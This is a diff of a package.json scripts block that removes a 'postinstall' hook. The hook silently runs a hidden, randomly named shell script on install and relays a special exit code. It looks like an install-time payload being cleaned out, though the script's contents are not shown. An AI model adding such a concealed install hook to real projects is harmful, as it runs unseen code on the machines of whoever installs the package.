@@ -13,8 +13,7 @@
     "test": "pnpm -r test",
     "lint": "eslint .",
     "fix": "eslint . --fix && prettier --write .",
-    "prepare": "husky",
-    "postinstall": "sh ./.ci-h0vr28.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepare": "husky"
   },
   "devDependencies": {
     "@types/node": "^24.10.1",
